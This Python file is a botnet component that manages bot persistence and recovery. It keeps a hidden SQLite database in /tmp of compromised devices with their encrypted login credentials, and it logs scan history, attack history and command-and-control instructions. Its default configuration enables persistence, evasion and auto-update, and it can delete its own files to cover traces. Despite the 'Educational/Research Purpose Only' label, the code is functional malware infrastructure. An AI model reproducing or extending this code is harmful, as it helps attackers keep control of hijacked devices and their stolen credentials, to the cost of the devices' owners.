#!/usr/bin/env python3
"""
Session Manager - Bot Persistence and Recovery
Educational/Research Purpose Only

Handles session persistence, recovery, and state management for the botnet.
Includes mechanisms for:
- Session state persistence
- Bot recovery after restart
- Configuration management
- Credential storage
- Attack history tracking
"""

import os
import json
import time
import pickle
import base64
import sqlite3
import hashlib
from datetime import datetime, timedelta
from typing import Dict, List, Optional, Any
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

class SessionManager:
    def __init__(self, bot_id: str, session_dir: str = "/tmp"):
        self.bot_id = bot_id
        self.session_dir = session_dir
        self.session_file = os.path.join(session_dir, f".{bot_id}_session.db")
        self.config_file = os.path.join(session_dir, f".{bot_id}_config.json")
        
        # Encryption key for sensitive data
        self.encryption_key = self._derive_encryption_key()
        self.cipher = Fernet(self.encryption_key)
        
        # Initialize session database
        self._init_session_db()
        
        # Session state
        self.session_data = {
            'bot_id': bot_id,
            'created': datetime.now().isoformat(),
            'last_update': datetime.now().isoformat(),
            'compromised_devices': [],
            'scan_history': [],
            'attack_history': [],
            'c2_commands': [],
            'configuration': self._default_config()
        }
        
        # Load existing session if available
        self.load_session()
    
    def _derive_encryption_key(self) -> bytes:
        """Derive encryption key from bot ID and system info"""
        try:
            # Use bot ID and system characteristics as password
            password = f"{self.bot_id}_{os.getpid()}_{time.time()}".encode()
            
            # Generate salt from system info
            salt = hashlib.sha256(f"{os.uname().machine}_{os.uname().system}".encode()).digest()[:16]
            
            # Derive key using PBKDF2
            kdf = PBKDF2HMAC(
                algorithm=hashes.SHA256(),
                length=32,
                salt=salt,
                iterations=100000,
            )
            key = base64.urlsafe_b64encode(kdf.derive(password))
            return key
        except:
            # Fallback to simple key derivation
            simple_key = hashlib.sha256(self.bot_id.encode()).digest()
            return base64.urlsafe_b64encode(simple_key)
    
    def _init_session_db(self):
        """Initialize SQLite database for session persistence"""
        try:
            conn = sqlite3.connect(self.session_file)
            cursor = conn.cursor()
            
            # Create tables
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS session_state (
                    key TEXT PRIMARY KEY,
                    value TEXT,
                    encrypted BOOLEAN DEFAULT 0,
                    timestamp TEXT
                )
            ''')
            
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS compromised_devices (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    host TEXT,
                    port INTEGER,
                    username TEXT,
                    password TEXT,
                    fingerprint TEXT,
                    compromise_time TEXT,
                    last_contact TEXT,
                    status TEXT DEFAULT 'active'
                )
            ''')
            
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS scan_history (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    target_range TEXT,
                    scan_time TEXT,
                    targets_found INTEGER,
                    successful_compromises INTEGER,
                    scan_duration REAL
                )
            ''')
            
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS attack_history (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    attack_type TEXT,
                    target TEXT,
                    start_time TEXT,
                    duration INTEGER,
                    success BOOLEAN,
                    details TEXT
                )
            ''')
            
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS c2_commands (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    command_id TEXT,
                    command_type TEXT,
                    command_data TEXT,
                    received_time TEXT,
                    executed_time TEXT,
                    status TEXT DEFAULT 'pending',
                    result TEXT
                )
            ''')
            
            conn.commit()
            conn.close()
            
        except Exception as e:
            print(f"[!] Failed to initialize session database: {e}")
    
    def _default_config(self) -> Dict:
        """Default bot configuration"""
        return {
            'scan_threads': 100,
            'scan_timeout': 5,
            'exploit_delay': [1, 3],
            'persistence_enabled': True,
            'evasion_enabled': True,
            'max_devices': 1000,
            'c2_poll_interval': 30,
            'heartbeat_interval': 60,
            'auto_update': True,
            'debug_mode': False
        }
    
    def encrypt_data(self, data: str) -> str:
        """Encrypt sensitive data"""
        try:
            encrypted = self.cipher.encrypt(data.encode())
            return base64.b64encode(encrypted).decode()
        except:
            return data  # Return original if encryption fails
    
    def decrypt_data(self, encrypted_data: str) -> str:
        """Decrypt sensitive data"""
        try:
            decoded = base64.b64decode(encrypted_data.encode())
            decrypted = self.cipher.decrypt(decoded)
            return decrypted.decode()
        except:
            return encrypted_data  # Return original if decryption fails
    
    def save_session(self):
        """Save current session state to persistent storage"""
        try:
            conn = sqlite3.connect(self.session_file)
            cursor = conn.cursor()
            
            # Update last update time
            self.session_data['last_update'] = datetime.now().isoformat()
            
            # Save main session data
            session_json = json.dumps(self.session_data)
            cursor.execute('''
                INSERT OR REPLACE INTO session_state (key, value, timestamp)
                VALUES (?, ?, ?)
            ''', ('main_session', session_json, datetime.now().isoformat()))
            
            conn.commit()
            conn.close()
            
            # Save configuration
            self._save_config()
            
        except Exception as e:
            print(f"[!] Failed to save session: {e}")
    
    def load_session(self) -> bool:
        """Load session state from persistent storage"""
        try:
            if not os.path.exists(self.session_file):
                return False
            
            conn = sqlite3.connect(self.session_file)
            cursor = conn.cursor()
            
            # Load main session data
            cursor.execute('SELECT value FROM session_state WHERE key = ?', ('main_session',))
            result = cursor.fetchone()
            
            if result:
                loaded_data = json.loads(result[0])
                self.session_data.update(loaded_data)
                print(f"[*] Loaded session data from {self.session_file}")
            
            conn.close()
            
            # Load configuration
            self._load_config()
            
            return True
            
        except Exception as e:
            print(f"[!] Failed to load session: {e}")
            return False
    
    def _save_config(self):
        """Save configuration to file"""
        try:
            with open(self.config_file, 'w') as f:
                json.dump(self.session_data['configuration'], f, indent=2)
        except Exception as e:
            print(f"[!] Failed to save config: {e}")
    
    def _load_config(self):
        """Load configuration from file"""
        try:
            if os.path.exists(self.config_file):
                with open(self.config_file, 'r') as f:
                    config = json.load(f)
                    self.session_data['configuration'].update(config)
        except Exception as e:
            print(f"[!] Failed to load config: {e}")
    
    def add_compromised_device(self, device_info: Dict):
        """Add compromised device to persistent storage"""
        try:
            conn = sqlite3.connect(self.session_file)
            cursor = conn.cursor()
            
            # Encrypt sensitive credentials
            encrypted_password = self.encrypt_data(device_info['credentials'][1])
            
            cursor.execute('''
                INSERT INTO compromised_devices 
                (host, port, username, password, fingerprint, compromise_time, last_contact, status)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?)
            ''', (
                device_info['host'],
                device_info.get('port', 23),
                device_info['credentials'][0],
                encrypted_password,
                json.dumps(device_info.get('fingerprint', {})),
                device_info['compromise_time'],
                datetime.now().isoformat(),
                device_info.get('status', 'active')
            ))
            
            conn.commit()
            conn.close()
            
            # Add to session data
            self.session_data['compromised_devices'].append(device_info)
            
        except Exception as e:
            print(f"[!] Failed to add compromised device: {e}")
    
    def get_compromised_devices(self) -> List[Dict]:
        """Get all compromised devices from storage"""
        devices = []
        try:
            conn = sqlite3.connect(self.session_file)
            cursor = conn.cursor()
            
            cursor.execute('SELECT * FROM compromised_devices WHERE status = "active"')
            rows = cursor.fetchall()
            
            for row in rows:
                device = {
                    'id': row[0],
                    'host': row[1],
                    'port': row[2],
                    'credentials': (row[3], self.decrypt_data(row[4])),
                    'fingerprint': json.loads(row[5]) if row[5] else {},
                    'compromise_time': row[6],
                    'last_contact': row[7],
                    'status': row[8]
                }
                devices.append(device)
            
            conn.close()
            
        except Exception as e:
            print(f"[!] Failed to get compromised devices: {e}")
        
        return devices
    
    def update_device_status(self, host: str, status: str, last_contact: str = None):
        """Update device status and last contact time"""
        try:
            conn = sqlite3.connect(self.session_file)
            cursor = conn.cursor()
            
            if last_contact is None:
                last_contact = datetime.now().isoformat()
            
            cursor.execute('''
                UPDATE compromised_devices 
                SET status = ?, last_contact = ?
                WHERE host = ?
            ''', (status, last_contact, host))
            
            conn.commit()
            conn.close()
            
        except Exception as e:
            print(f"[!] Failed to update device status: {e}")
    
    def log_scan_activity(self, target_range: str, targets_found: int, 
                         successful_compromises: int, scan_duration: float):
        """Log scanning activity"""
        try:
            conn = sqlite3.connect(self.session_file)
            cursor = conn.cursor()
            
            cursor.execute('''
                INSERT INTO scan_history 
                (target_range, scan_time, targets_found, successful_compromises, scan_duration)
                VALUES (?, ?, ?, ?, ?)
            ''', (
                target_range,
                datetime.now().isoformat(),
                targets_found,
                successful_compromises,
                scan_duration
            ))
            
            conn.commit()
            conn.close()
            
            # Add to session data
            scan_entry = {
                'target_range': target_range,
                'scan_time': datetime.now().isoformat(),
                'targets_found': targets_found,
                'successful_compromises': successful_compromises,
                'scan_duration': scan_duration
            }
            self.session_data['scan_history'].append(scan_entry)
            
        except Exception as e:
            print(f"[!] Failed to log scan activity: {e}")
    
    def log_attack_activity(self, attack_type: str, target: str, duration: int, 
                           success: bool, details: str = ""):
        """Log attack activity"""
        try:
            conn = sqlite3.connect(self.session_file)
            cursor = conn.cursor()
            
            cursor.execute('''
                INSERT INTO attack_history 
                (attack_type, target, start_time, duration, success, details)
                VALUES (?, ?, ?, ?, ?, ?)
            ''', (
                attack_type,
                target,
                datetime.now().isoformat(),
                duration,
                success,
                details
            ))
            
            conn.commit()
            conn.close()
            
            # Add to session data
            attack_entry = {
                'attack_type': attack_type,
                'target': target,
                'start_time': datetime.now().isoformat(),
                'duration': duration,
                'success': success,
                'details': details
            }
            self.session_data['attack_history'].append(attack_entry)
            
        except Exception as e:
            print(f"[!] Failed to log attack activity: {e}")
    
    def log_c2_command(self, command_id: str, command_type: str, 
                      command_data: Dict, status: str = 'pending'):
        """Log C2 command for tracking"""
        try:
            conn = sqlite3.connect(self.session_file)
            cursor = conn.cursor()
            
            cursor.execute('''
                INSERT INTO c2_commands 
                (command_id, command_type, command_data, received_time, status)
                VALUES (?, ?, ?, ?, ?)
            ''', (
                command_id,
                command_type,
                json.dumps(command_data),
                datetime.now().isoformat(),
                status
            ))
            
            conn.commit()
            conn.close()
            
        except Exception as e:
            print(f"[!] Failed to log C2 command: {e}")
    
    def update_c2_command_status(self, command_id: str, status: str, result: str = ""):
        """Update C2 command execution status"""
        try:
            conn = sqlite3.connect(self.session_file)
            cursor = conn.cursor()
            
            cursor.execute('''
                UPDATE c2_commands 
                SET status = ?, executed_time = ?, result = ?
                WHERE command_id = ?
            ''', (status, datetime.now().isoformat(), result, command_id))
            
            conn.commit()
            conn.close()
            
        except Exception as e:
            print(f"[!] Failed to update C2 command status: {e}")
    
    def get_statistics(self) -> Dict:
        """Get bot statistics from persistent storage"""
        stats = {
            'total_scans': 0,
            'total_compromises': 0,
            'total_attacks': 0,
            'active_devices': 0,
            'success_rate': 0.0,
            'uptime': 0,
            'last_activity': None
        }
        
        try:
            conn = sqlite3.connect(self.session_file)
            cursor = conn.cursor()
            
            # Get scan statistics
            cursor.execute('SELECT COUNT(*), SUM(targets_found), SUM(successful_compromises) FROM scan_history')
            scan_stats = cursor.fetchone()
            if scan_stats[0]:
                stats['total_scans'] = scan_stats[0]
                stats['total_targets'] = scan_stats[1] or 0
                stats['total_compromises'] = scan_stats[2] or 0
                if stats['total_targets'] > 0:
                    stats['success_rate'] = (stats['total_compromises'] / stats['total_targets']) * 100
            
            # Get attack statistics
            cursor.execute('SELECT COUNT(*) FROM attack_history')
            attack_count = cursor.fetchone()[0]
            stats['total_attacks'] = attack_count
            
            # Get active devices
            cursor.execute('SELECT COUNT(*) FROM compromised_devices WHERE status = "active"')
            active_devices = cursor.fetchone()[0]
            stats['active_devices'] = active_devices
            
            # Get last activity
            cursor.execute('SELECT MAX(scan_time) FROM scan_history')
            last_scan = cursor.fetchone()[0]
            cursor.execute('SELECT MAX(start_time) FROM attack_history')
            last_attack = cursor.fetchone()[0]
            
            if last_scan or last_attack:
                stats['last_activity'] = max(filter(None, [last_scan, last_attack]))
            
            conn.close()
            
            # Calculate uptime
            if 'created' in self.session_data:
                created_time = datetime.fromisoformat(self.session_data['created'])
                uptime = datetime.now() - created_time
                stats['uptime'] = uptime.total_seconds()
            
        except Exception as e:
            print(f"[!] Failed to get statistics: {e}")
        
        return stats
    
    def cleanup_session(self):
        """Clean up session files and data"""
        try:
            # Remove session files
            if os.path.exists(self.session_file):
                os.remove(self.session_file)
            
            if os.path.exists(self.config_file):
                os.remove(self.config_file)
            
            print("[*] Session cleanup completed")
            
        except Exception as e:
            print(f"[!] Session cleanup failed: {e}")
    
    def export_session_data(self, output_file: str):
        """Export session data for analysis or backup"""
        try:
            export_data = {
                'session_info': self.session_data,
                'statistics': self.get_statistics(),
                'compromised_devices': self.get_compromised_devices(),
                'export_time': datetime.now().isoformat()
            }
            
            with open(output_file, 'w') as f:
                json.dump(export_data, f, indent=2)
            
            print(f"[*] Session data exported to {output_file}")
            
        except Exception as e:
            print(f"[!] Failed to export session data: {e}")
